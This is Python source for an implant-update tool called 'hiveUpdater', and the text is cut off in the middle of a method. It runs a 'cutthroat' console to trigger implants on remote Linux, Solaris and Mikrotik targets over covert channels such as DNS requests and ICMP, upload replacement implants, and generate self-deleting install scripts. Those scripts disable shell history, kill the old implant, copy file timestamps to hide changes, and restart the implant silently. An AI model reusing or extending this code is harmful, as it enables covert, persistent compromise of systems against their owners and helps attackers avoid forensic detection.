#!/usr/bin/python

import pexpect, sys, os, time, exceptions
from datetime import datetime
import ConfigParser

'''
	      USAGE:  hiveUpdater IP_Address ConfigurationFile" 
		     	
 
    Currently, the second argument should be the IP address of the hive implant you 
    want to trigger and update 
								OR
	The name of a file containing only IP Addresses of the targets to be updated, one IP Address per line...
	
	The third argument contains specifiec information to the IP Address or the Target List that will be used to update 
    the current hive implant.

    
    EXAMPLE:
	./updateHiver.py 10.2.9.6 hiveConfigurationFile
	./updateHiver.py targetList hiveConfigurationFile

    DEPENDENCIES:
	Python with pexpect...
	Fully functional cutthroat with hive ILM

'''


'''
	 validIP(address)

     Makes sure the address is of the form A.B.C.D where A,B,C, and D are greater than or equal to 0
     and less than or equal to 255.
'''
def validIP(address):
	try:
		parts = address.split(".")
		if len(parts) != 4:
			print "\n\n  Invalid: [%s] is not a valid IPv4 address.\n" % (address)
			return False
		for item in parts:
			if not 0 <= int(item) <= 255:
				print "\n\n  Invalid: [%s] is not a valid IPv4 address.\n" % (address)
				return False
		return True
	except IOError, (errno, strerror):
		print "I/O Error(%s) : %s" % (errno, strerror)
		return False


'''
	 validPort(port)

     Ensures 0 < port < 65536.
'''
def validPort(port):
	badPortMessage="\n\n  FAILURE:  The port [%s] entered is not a valid port [1-65535].\n\n" % (port)
	if int(port) < 1:
		print badPortMessage
		return False
	elif int(port) > 65535:
		print badPortMessage
		return False
	return True
	

'''
	 validProtocol(protocol)

	 Ensures protocol is dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq .

'''
def validProtocol(protocol):
	badProtocolMessage="\n\n  FAILURE: Invalid protocol ["+protocol+"] entered.  It must be one of the following:\n     dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq\n     Bye.\n\n"
	if protocol == "dns-request":
		return True
	elif protocol == "icmp-error":
		return True
	elif protocol == "ping-request":
		return True
	elif protocol == "ping-reply":
		return True
	elif protocol == "raw-tcp":
		return True
	elif protocol == "raw-udp":
		return True
	elif protocol == "tftp-wrq":
		return True
	else:
		print badProtocolMessage
		return False


'''
	 validOS(opsys)

	 Ensures operating systems is Linux, Windows, Solaris, or MT for Mikrotik (le, be, ppc, or x86) .

'''
def validOS(opsys):
	badOSMessage="\n\n  FAILURE: Invalid operating System.  It must be one of the following:\n     Linux, Windows, Solaris Sparc, Solaris x86, Mikrotik MIPS BE, Mikrotik MIPS LE, Mikrotik PPC, or Mikrotik x86.\n     WE SHOULD NEVER GET HERE.... Bye.\n\n"
	if opsys == "Mikrotik MIPS BE": 
		return True
	elif opsys == "Mikrotik MIPS LE":
		return True
	elif opsys == "Mikrotik PPC":
		return True
	elif opsys == "Mikrotik x86": 
		return True
	elif opsys == "Solaris Sparc": 
		return True
	elif opsys == "Solaris x86": 
		return True
	elif opsys == "Linux":
		return True
	elif opsys == "Windows":
		return True
	else:
		print badOSMessage
		return False

'''
     cut_3_interface

     Common interface command for three pattern term matching...

     Index 0: Always use the desired matching term for the first value in the pattern.
     Index 1 corresponds to pexpect.EOF
     Index 2 corresponds to pexpect.TIOMEOUT
'''
def cut_3_interface( cutT, patternA, timeoutValue, referenceContent):
	try:
		index= cutT.expect( patternA )
		if index == 0:
			print referenceContent+": Good match where patternA=<"+patternA+">"
		print cutT.before    #Only used in 3rd log...
	except pexpect.EOF:
		print "FAILED MATCH: Desired match did not occur..."
        	print cutT.before
        	print cutT.after
	except pexpect.TIMEOUT:
		print "Timeout of "+timeoutValue+" occurred."
        	print cutT.before
        	print cutT.after


#====================================================================================================================

class hiveConfigParser(ConfigParser.ConfigParser):
	#================================================================
	def __init__(self):
		print "hiveConfigParser.__init__:"
		ConfigParser.ConfigParser.__init__(self)

		#Remote contains information about the remote box
		self.add_section('Remote')
		self.set('Remote', 'remoteIP', 'default_remoteIP')									#remoteIP
		self.set('Remote', 'triggerProtocol', 'default_triggerProtocol')						#triggerProtocol
		self.set('Remote', 'remotePort', 'default_remotePort')				#remotePort=0 except for raw-tcp and raw-udp triggerProtocol							
		self.set('Remote', 'operatingSystem', 'default_operatingSystem')						#operatingSystem
		self.set('Remote', 'busyboxName', 'default_busyboxName')								#bbName
		self.set('Remote', 'oldImplant', 'default_oldImplant')								#oldImplantName
		self.set('Remote', 'installationDirectory', '/default_installationDirectory/')		#implantDirectory

		#Local
		self.add_section('Local')
		self.set('Local', 'localIP', 'default_LocalIP')										#callbackIP
		self.set('Local', 'localPort', 'default_LocalPort')									#callbackPort

		#Payloads are files actuall installed on the remote box 
		self.add_section('Payload')
		self.set('Payload', 'newPayload', 'default_NewPayload')								#newImplantName
		self.set('Payload', 'tempPayload', 'default_tempPayload')  							#newhive
		self.set('Payload', 'installation_Script_Name', 'default_installation_Script_Name')  #installationScript
		self.set('Payload', 'operation', 'hiveUpdate')
				
		#Targets is a listing of IP addresses that this operation will be directed against.
		self.add_section('Targets')
		self.set('Targets', 'list', 'default_None')
	
	#================================================================
	def getRemoteIP(self):
		print "\n\n remoteIP=["+self.get('Remote', 'remoteIP', 0)+"]\n\n"
		return self.get('Remote', 'remoteIP', 0)

	
	#================================================================
	def setRemoteIP(self, rIP):
		self.set('Remote', 'remoteIP', rIP)
		print "\n\n setRemoteIP:  remoteIP=["+self.get('Remote', 'remoteIP', 0)+"]\n\n"

	
	#================================================================
	def setTargetList(self, targetList):
		self.set('Targets', 'list', targetList)
		print "\n\n setTargetList:  targetList=["+self.get('Targets', 'list', 0)+"]\n\n"

	
	#================================================================
	def getTargetList(self):
		print "\n\n TargetList=["+self.get('Targets', 'list', 0)+"]\n\n"
		return self.get('Targets', 'list', 0)

	#================================================================
	def clearTargetList(self):
		print "\n\n TargetList=["+self.get('Targets', 'list', 0)+"]"
		self.set('Targets', 'list', 'default_None')
		print " being cleared to ["+self.get('Targets', 'list', 0)+"]\n"

	#================================================================
	def setBusyBox(self):

        	os.system("clear")
		print "\n\n\n Remote Target Box ...\n"
		print "\n\n\n" 
		busyboxName="N/A"		
		if self.get('Remote', 'operatingSystem', 0) == "Mikrotik MIPS PPC":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
		elif self.get('Remote', 'operatingSystem', 0) == "Mikrotik MIPS x86":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
		elif self.get('Remote', 'operatingSystem', 0) == "Mikrotik MIPS LE":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
		elif self.get('Remote', 'operatingSystem', 0) == "Mikrotik MIPS BE":
			busyboxName = raw_input('What is the full name [pathname included] of the busybox executable stored on the Mikrotik router? ')
		else:
			pass      #BusyBox is not used on Linux, Solaris, or Windows architectures...
		self.set('Remote', 'busyboxName', busyboxName)

	#================================================================
	def setOperatingSystem(self):

		OSes = [['Mikrotik MIPS BE','mt-mipsbe','linux:mipsbe:mikrotik'],['Mikrotik MIPS LE','mt-mipsle','linux:mipsle:mikrotik'],['Mikrotik PPC','mt-ppc','linux:ppc:mikrotik'],['Mikrotik x86','mt-x86','linux:x86:mikrotik'],['Solaris Sparc','sol-sparc','solaris:sparc'],['Solaris x86','sol-x86','solaris:x86'],['Linux', 'linux-x86', 'linux-386']] 
		OS_Name = '' # Screen name for OS
        	os.system("clear")
		print "\n\n\n Remote Target Box ..."
		print "\n\n\n" 
		while (1):
			print "Enter a number for architecture/OS of the remote Target: " 
			print "1 - Mikrotik MIPS BE" 
			print "2 - Mikrotik MIPS LE" 
			print "3 - Mikrotik PPC" 
			print "4 - Mikrotik x86" 
			print "5 - Solaris Sparc" 
			print "6 - Solaris x86" 
			print "7 - Linux" 
			usr_inp = raw_input( 'Enter your choice (1-7): ' ).strip()
			try:
				if (int(usr_inp) < 1) or (raw_input("Are you sure that the OS is " + OSes[int(usr_inp)-1][0] + "? [y] ") not in ['yes','y','Yes']):
					os.system("clear")
					print "\n\n" 
					print "Try Again" 
					continue
				elif (1 <= int(usr_inp) <= 7):          
					break
				else:
					print "Invalid Option, Try Again" 
					continue
			except:
				os.system("clear")
				print "\n\n" 
				print "Invalid Option, Try Again" 
				continue

		OS_Name = OSes[int(usr_inp) -1][0]
		if validOS(OS_Name):    
			self.set('Remote', 'operatingSystem', OS_Name)		#operatingSystem
		else:
			sys.exit()

	#================================================================
	def setRemotePort(self):

		remotePort = 0
		os.system("clear")
		print "\n\n\n Remote Target Box ..."
		print "\n\n\n" 
		if self.get('Remote', 'triggerProtocol', 0) == "raw-udp":
			remotePort =  raw_input('What remote port [1 - 65535] for raw-udp will you be using? ')
			if not validPort(remotePort):
				sys.exit()
		elif self.get('Remote', 'triggerProtocol', 0) == "raw-tcp":
			remotePort =  raw_input('What remote port [1 - 65535] for raw-tcp will you be using? ')
			if not validPort(remotePort):
				sys.exit()
		else:
			pass
		self.set('Remote', 'remotePort', remotePort)		#remotePort=0 except for raw-tcp and raw-udp triggerProtocol			
		

	#================================================================
	def setConfigurationSettings( self, fileName , remoteIP ):
		#Get input parameters...
		#===============================================================================================
		if os.path.isfile(remoteIP):
			if not validIP(remoteIP):
				self.set('Targets', 'list', remoteIP)
			else:
				self.set('Remote', 'remoteIP', remoteIP)
				self.clearTargetList()
		else:
			if validIP(remoteIP):
				self.set('Remote', 'remoteIP', remoteIP)
				pass
			else:
				print "\n\n       Invalid input [" + remoteIP +"] provided for a remoteIP or targetList filename.\n\n"
				sys.exit()
        	
		os.system("clear")
		print "\n\n   No Hive Configuration file [%s] found, so you'll have to answer some questions to create one...\n\n" % (fileName)

		print "\n\n\n Starting to set Configuration Parameters...\n\n\n"
		time.sleep(5)

		os.system("clear")
		print "\n\n\n Local Box Parameter...\n\n\n"
		callbackIP = raw_input('What is your callback IP address? ')
		if not validIP(callbackIP):
			sys.exit()
		self.set('Local', 'localIP', callbackIP)										#callbackIP

		os.system("clear")
		print "\n\n\n Local Box Parameter...\n\n\n"
		callbackPort = raw_input('What is your callback port? ')
		if not validPort(callbackPort):
			sys.exit()
		self.set('Local', 'localPort', callbackPort)									#callbackPort
		
		os.system("clear")
		print "\n\n\n Local Box Parameter...\n\n\n"
		#newImplantName = "hived-linux-i386-PATCHED"
		print "\nThis section refers to the new LOCAL implant for new installation on the target.\n\n"
		newImplantName = raw_input('Name of the new LOCAL hive implant for uploading? ') 
		self.set('Payload', 'newPayload', newImplantName)		#newImplantName

		self.setTriggerProtocol()

		self.setRemotePort()

		self.setOperatingSystem()

		self.setBusyBox()	
		
		os.system("clear")
		print "\n\n\n Remote Target Box ...\n\n\n"
		#oldImplantName = "hived-linux-i386-PATCHED"
		print "\nThe section refers to the old implant's name on the remote box. It will be replaced.\n\n"
		oldImplantName = raw_input('What is the name of the old implant? ')
		self.set('Remote', 'oldImplant', oldImplantName)		#oldImplantName
		
		os.system("clear")
		print "\n\n\n Remote Target Box ...\n\n\n"
		#implantDirectory = "/home/miker/runningHive/"
		implantDirectory = raw_input('What is the full path listing of the directory for installation? ')   
		self.set('Remote', 'installationDirectory', implantDirectory)		#implantDirectory
		
		os.system("clear")
		print "\n\n\n Remote Target Box ...\n\n\n"
		tempPayload="tempPayload"
		print "\nThis section names a temporary File [tempPayload] that will be deleted.\n\n"
		tempPayload = raw_input("What is the temporary payload\'s File name? ")   
		self.set('Payload', 'tempPayload', tempPayload)  		#newhive
		
		
		os.system("clear")
		print "\n\n\n Remote Target Box ...\n\n\n"
		print "\nThis section refers to a self deleting installation file on the remote box.\n\n"
		#installationScript = "install_Linux_script"
		installationScript = raw_input('What name would you like to call the installation script? ') 
		self.set('Payload', 'installation_Script_Name', installationScript)  #installationScript

		self.set('Payload', 'operation', 'hiveUpdate')

		#
		#    Create the hiveUpdaterFile...
		with open( fileName, 'wb') as configfile:
			self.write(configfile)

	#================================================================
	def setTriggerProtocol(self):

		tP = [['dns-request'],['icmp-error'],['ping-request'],['ping-reply'],['raw-tcp'],['raw-udp'],['tftp-wrq']] 
        	os.system("clear")
		print "\n\n\n Remote Target Box ...\n"
		print "\n\n\n" 
		while (1):
			print "Enter a number for the desired trigger Protocol: " 
			print "1 - dns-request" 
			print "2 - icmp-error" 
			print "3 - ping-request" 
			print "4 - ping-reply" 
			print "5 - raw-tcp" 
			print "6 - raw-udp" 
			print "7 - tftp-wrq" 
			usr_inp = raw_input( 'Enter your choice (1-7): ' ).strip()
			try:
				if (int(usr_inp) < 1) or (raw_input("Are you sure that the trigger Protocol is " + tP[int(usr_inp)-1][0] + "? [y] ") not in ['yes','y','Yes']):
					os.system("clear")
					print "\n\n" 
					print "Try Again" 
					continue
				elif (1 <= int(usr_inp) <= 7):          
					break
				else:
					print "Invalid Option, Try Again" 
					continue
			except:
				os.system("clear")
				print "\n\n" 
				print "Invalid Option, Try Again" 
				continue

		triggerProtocol = tP[int(usr_inp) -1][0]
		if validProtocol(triggerProtocol):    
			self.set('Remote', 'triggerProtocol', triggerProtocol)		#triggerProtocol
		else:
			sys.exit()

	#================================================================
	def make_Linux_hiveUpdateInstallationScript(self):
		#===================================
		#        Linux Installation script
		#===================================
		installationFile = open( self.get('Payload', 'installation_Script_Name', 0) , "w")
		installationFile.write('#!/bin/bash\n\n\n')
		installationFile.write("fileToDelete=$0\n\n")
		
		installationFile.write('#Remove history temporarily...\n')
		installationFile.write("OLDHISTFILE=$HISTFILE\n")
		installationFile.write("unset HISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write("OLDHISTSIZE=$HISTSIZE\n")
		installationFile.write("HISTSIZE=0\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write('\n')

		installationFile.write('#Most logic required to replace and restart implant...\n')
		installationFile.write('\n')

		#installationFile.write("kill -9 `ps -ef | grep [h]ived-linux-i386-PATCHED | grep -v grep | awk '\{print \$2\}\' \` 2>/dev/null \n")
		installationFile.write("kill -9 `ps -ef | grep ")
		installationFile.write( self.get('Remote', 'oldImplant', 0) )
		installationFile.write(" | grep -v grep | awk \'{ ")
		installationFile.write("print $2 }\' ` ")
		installationFile.write('2>/dev/null')
		installationFile.write("\n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Saved time information   \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write('\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#installationFile.write('rm -f ./hived-linux-i386-PATCHED 2>/dev/null\n')
		installationFile.write("rm -f ")
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		#installationFile.write('cp -f ./newhive ./hived-linux-i386-PATCHED 2>/dev/null\n')
		installationFile.write('cp -f ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write( self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Transferred time information back \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' 2>/dev/null\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#installationFile.write('/usr/bin/nohup /home/miker/runningHive/hived-linux-i386-PATCHED & \n')
		#installationFile.write('/usr/bin/nohup ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" &>/dev/null \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write('#Remove tempPayload file if it exists\n')
		#installationFile.write('rm -f /home/miker/runningHive/newhive 2>/dev/null\n')
		installationFile.write('rm -f ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0))
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(" 2>/dev/null\n")
		installationFile.write('\n')

		installationFile.write("#Reset History.\n")
		installationFile.write("HISTSIZE=$OLDHISTSIZE\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write("set HISTFILE $OLDHISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write('\n')

		installationFile.write('#Remove the installation script...\n')
		installationFile.write('rm -f $fileToDelete 2>/dev/null\n')
		installationFile.close()

	#================================================================
	def make_MT_hiveUpdateInstallationScript(self):
		#===================================
		#        Mikrotik Installation script
		#===================================
		installationFile = open(self.get('Payload', 'installation_Script_Name',0), "w")
		installationFile.write('#!/bin/bash\n\n\n')

		installationFile.write('fileToDelete=$0\n')
		installationFile.write('\n')

		installationFile.write('#Most logic required to replace and restart implant...\n')
		installationFile.write('\n')

		#/rw/pckg/busybox killall hived-mikrotik-mipsbe-PATCHED
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" killall ")
		installationFile.write(self.get('Remote', 'oldImplant', 0))
		installationFile.write('\n')
		installationFile.write('\n')

		#/rw/pckg/busybox sleep 5
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" sleep 5\n")
		installationFile.write('\n')

		installationFile.write("#   Save the time information.\n")
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" touch -r ")
                installationFile.write( self.get('Remote', 'installationDirectory', 0) )
                installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
                installationFile.write(' ')
                installationFile.write( self.get('Remote', 'installationDirectory', 0) )
                installationFile.write(self.get('Remote', 'oldImplant', 0) )
                installationFile.write(' 2>/dev/null\n')
                installationFile.write(' \n')

                #/rw/pckg/busybox sleep 2
                installationFile.write(self.get('Remote', 'busyboxName', 0))
                installationFile.write(" sleep 2\n")
                installationFile.write('\n')

		#mv newhive hived-mikrotik-mipsbe-PATCHED
		#installationFile.write("mv ")
		#installationFile.write(self.get('Payload', 'tempPayload', 0))
		#installationFile.write(" ")
		#installationFile.write(self.get('Remote', 'oldImplant', 0))
		#installationFile.write("\n")

		installationFile.write('cp -f ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write( self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('\n')

		#/rw/pckg/busybox sleep 5
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(" sleep 5\n")
		installationFile.write('\n')

		installationFile.write("#  Transferred time information back \n")
		installationFile.write(self.get('Remote', 'busyboxName', 0))
		installationFile.write(' touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(" 2>/dev/null \n")
		installationFile.write('\n')

                #/rw/pckg/busybox sleep 5
                installationFile.write(self.get('Remote', 'busyboxName', 0))
                installationFile.write(" sleep 5\n")
                installationFile.write('\n')

		#/rw/pckg/hived-mikrotik-mipsbe-PATCHED &
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(' & \n')
		installationFile.write('\n')

		installationFile.write('#Remove tempPayload file if it exists\n')
		#rm -f /rw/pckg/newhive 2>/dev/null 
		installationFile.write(' rm -f ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0))
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(' 2>/dev/null \n') 
		installationFile.write('\n')

		installationFile.write('#Remove this installation script\n')
		#rm -f $fileToDelete 2>/dev/null
		installationFile.write('rm -f $fileToDelete 2>/dev/null \n')
		installationFile.write('\n')

		installationFile.close()

	#================================================================
	def make_Solaris_hiveUpdateInstallationScript(self):
		#===================================
		#        Solaris Installation script
		#===================================
		installationFile = open(self.get('Payload', 'installation_Script_Name',0), "w")
		installationFile.write('#!/bin/bash\n\n\n')
	
		installationFile.write('fileToDelete=$0\n')
		installationFile.write('\n')
		
		installationFile.write('#Remove history temporarily...\n')
		installationFile.write("OLDHISTFILE=$HISTFILE\n")
		installationFile.write("unset HISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write("OLDHISTSIZE=$HISTSIZE\n")
		installationFile.write("HISTSIZE=0\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write('\n')

		installationFile.write('#Most logic required to replace and restart implant...\n')
		installationFile.write('\n')

		#kill -9 `ps -ef | grep /export/home/[h]ived-solaris-sparc-PATCHED | grep -v grep | awk '{print $2}' ` 2>/dev/null
		installationFile.write("kill -9 `ps -ef | grep ")
		installationFile.write(self.get('Remote', 'oldImplant', 0))
		installationFile.write(" | grep -v grep | awk \'{ ")
		installationFile.write("print $2 }\' ` ")
		installationFile.write('2>/dev/null')
		installationFile.write("\n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Saved time information   \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write('\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#Copies newhive back into the oldImplant
		#installationFile.write('cp -f ./newhive ./hived-linux-i386-PATCHED 2>/dev/null\n')
		installationFile.write("cp -f ./")
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(" ")
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null\n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Transferred time information back \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' 2>/dev/null\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#installationFile.write('/usr/bin/nohup /export/home/hived-solaris-sparc-PATCHED & \n')
		installationFile.write('/usr/bin/nohup ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" & \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write('#Remove tempPayload file if it exists\n')
		#installationFile.write('rm -f /export/home/newhive 2>/dev/null\n')
		installationFile.write('rm -f ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0))
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(" 2>/dev/null\n")
		installationFile.write('\n')

		installationFile.write("#Reset History.\n")
		installationFile.write("HISTSIZE=$OLDHISTSIZE\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write("set HISTFILE $OLDHISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write('\n')

		installationFile.write('#Remove the installation script...\n')
		installationFile.write('rm -f $fileToDelete 2>/dev/null\n')
		installationFile.close()

	#================================================================
	def makeInstallationScript(self):
		#Delete the installFile  if it exists now for convenience and recreate it...
		if os.path.isfile(self.get('Payload', 'installation_Script_Name',0)):
			os.remove(self.get('Payload', 'installation_Script_Name',0))

		OS = self.get('Remote', 'operatingSystem', 0)

		#Linux
		if OS == "Linux":
			self.make_Linux_hiveUpdateInstallationScript()
	
		#Mikrotik	
		elif  OS == "Mikrotik MIPS PPC":
			self.make_MT_hiveUpdateInstallationScript()
		elif OS == "Mikrotik MIPS x86":
			self.make_MT_hiveUpdateInstallationScript()
		elif OS == "Mikrotik MIPS LE":
			self.make_MT_hiveUpdateInstallationScript()
		elif OS == "Mikrotik MIPS BE":
			self.make_MT_hiveUpdateInstallationScript()
	
		#Solaris		
		elif OS == "Solaris Sparc":
			print "\n\n\n Making Solaris Script\n\n\n"
			self.make_Solaris_hiveUpdateInstallationScript()
		elif OS == "Solaris x86":
			self.make_Solaris_hiveUpdateInstallationScript()

		else:
			print "\n\n This only works for MT, Linux, or Solaris systems at this time.\n\n"

	#================================================================
	'''

		runSingleUpdateOperation

		Uses pexpect to upload new implant, installScript, and make them executable while 
		maintaining a log file simultaneously called cutthroat_hiveUpdate_yyyymmdd_HHMMSS.log

	'''
	def runSingleUpdateOperation(self):
		print "\n\n runSingleUpdateOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now starting..."
		
		#           Pexpect starts cutthroat
		#
		#          ./cutthroat ./hive
		#
		#
		#Starts cutthroat and displays the initial startup

		commandLine="./cutthroat ./hive"
		print "Trying to spawn "+commandLine
		cutT = pexpect.spawn(commandLine)
		now=datetime.now()
		fileName="cutthroat_hiveUpdate_"+now.strftime('%Y%m%d_%H%M%S.')+"log"
		fout = file(fileName, 'w')
		cutT.logfile=fout

		index = cutT.expect( ['> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )

		if index == 0:
			print "Matched first index of \>"
			print cutT.before
			print cutT.after

		elif index == 1:
			print "FAILED MATCH: Desired match did not occur..."
			print cutT.before
			print cutT.after

		elif index == 2:
			print "Timeout of "+timeoutValue+" occurred."
			print cutT.before
			print cutT.after

		#pattern="['> ', pexpect.EOF, pexpect.TIMEOUT]"
		#cut_3_interface( cutT,  pattern, 20)

		if validIP( self.get('Remote', 'remoteIP', 0) ):
			pass
		else:
			print "\n\n\n\n\n runSingleUpdateOperation:  RemoteIP must be set...\n\n\n\n\n\n"
			sys.exit()

		#We will delete any previously built files for this remoteIP for convenience
		if os.path.isfile(self.get('Remote', 'remoteIP', 0)):
			os.remove(self.get('Remote', 'remoteIP', 0))

		print "Starting connect sequence."
		#
		#
		#            ilm connect ${remoteIP}
		#
		#
		#connection='ilm connect 10.2.9.6'
		connection='ilm connect '+self.get('Remote', 'remoteIP', 0) +''
		cutT.sendline(connection)

		#This section assumes the remoteIP file does not exist so it prompts the user for input...
		index = cutT.expect( ['\? ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
		if index == 0:
			print cutT.before
		elif index == 1:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 2:
			print "Timeout of 20 occurred"
			print cutT.before
			print cutT.after

		#cutT.sendline('  10.3.2.19')    #callback address
		cutT.sendline('  '+self.get('Local', 'localIP', 0))    #callback address

		patternA="\?"
		cut_3_interface( cutT,  patternA, 20, "callbackIPsent")

		cutT.sendline('  '+self.get('Local', 'localPort', 0))        #callback port
		cut_3_interface( cutT,  patternA, 20, "callbackPortsent")

		#cutT.sendline("  10.2.9.6")    #remote IP Address
		cutT.sendline('  '+self.get('Remote', 'remoteIP', 0))    #remote IP Address
		cut_3_interface( cutT,  patternA, 20, "remoteIPsent")

		#cutT.sendline("  dns-request")
		cutT.sendline('  '+self.get('Remote', 'triggerProtocol', 0))

		if (self.get('Remote', 'triggerProtocol', 0) == "raw-udp") or (self.get('Remote', 'triggerProtocol', 0) == "raw-tcp"):
			cut_3_interface( cutT,  patternA, 15, "rawTriggersent")
			cutT.sendline('  '+str(self.get('Remote', 'remotePort', 0)))

		#
		#
		#      Sends the trigger...
		#
		#
		index = cutT.expect( [' Trigger sent.', '> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
		if index == 0:
			print cutT.before
			print cutT.after
			now=datetime.now()
			print "      Sent on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
		elif index == 1:
			print "Matched >, raw-tcp post on remote host could not be reached..."
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout of 200 occurred"
			print cutT.before
			print cutT.after

		print "\n\n Waiting... \n\n"
		response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
		#index = cutT.expect( ['Success', 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=200 )
		index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=200 )
		if index == 0:
			print "Received response."
			print cutT.before
			print cutT.after
		elif index == 1:
			print "Failure occurred"
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout occurred. "
			now=datetime.now()
			print "      Trigger Timed out on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
			print cutT.before
			print cutT.after
			print "\n\nFAILED INITIAL TRIGGER RESPONSE from "+self.get('Remote', 'remoteIP', 0)+".\n\n"
			print "\n TargetsList = " + self.get('Targets', 'list', 0) +"\n"
			if os.path.isfile(self.get('Targets', 'list', 0)):
				return
			else:
				sys.exit()   #Causes batch processing to stop

		#cutT.sendline("  file put hived-mikrotik-mipsbe-PATCHED /rw/pckg/newhive")
		ctCommand= "  file put "+self.get('Payload', 'newPayload', 0)+" "+self.get('Remote', 'installationDirectory', 0) + self.get('Payload', 'tempPayload', 0)
		cutT.sendline(ctCommand)
		#
		#
		#      Sends the updated hive...
		#
		#
		response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
		index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

		if index == 0:
			print "Received response."
